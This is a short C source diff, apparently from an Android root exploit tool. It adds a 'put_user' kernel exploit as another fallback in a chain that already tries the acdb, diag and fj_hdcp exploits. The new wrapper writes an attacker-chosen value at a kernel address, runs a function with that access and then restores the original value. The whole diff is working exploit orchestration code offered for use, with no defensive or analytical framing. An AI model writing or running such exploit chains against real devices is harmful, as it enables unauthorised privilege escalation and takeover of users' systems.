@@ -6,6 +6,7 @@
 
 #include "libperf_event_exploit/perf_swevent.h"
 #include "libmsm_acdb_exploit/acdb.h"
+#include "libput_user_exploit/put_user.h"
 #include "libdiagexploit/diag.h"
 #include "libfj_hdcp_exploit/fj_hdcp.h"
 #include "mm.h"
@@ -60,6 +61,18 @@ attempt_fj_hdcp_exploit(unsigned long int address, unsigned long int value, unsi
 }
 
 static bool
+attempt_put_user_exploit(unsigned long int address, unsigned long int value, unsigned long int original_value, bool (*function)(void *), void *user_data)
+{
+  if (put_user_run_exploit(address, value, function, user_data)) {
+    put_user_write_value_at_address(address, original_value);
+
+    return true;
+  }
+
+  return false;
+}
+
+static bool
 attempt_diag_exploit(unsigned long int address, unsigned long int value, bool (*function)(void *), void *user_data)
 {
   struct diag_values injection_data;
@@ -75,6 +88,11 @@ run_function_by_exploit(unsigned long int *address, unsigned long int value, uns
 {
   printf("Attempt acdb exploit...\n");
   if (attempt_acdb_exploit((unsigned long int)address, value, restore_value, function, user_data)) {
+    return true;
+  }
+
+  printf("Attempt put_user exploit...\n");
+  if (attempt_put_user_exploit((unsigned long int)address, value, restore_value, function, user_data)) {
     return true;
   }
 
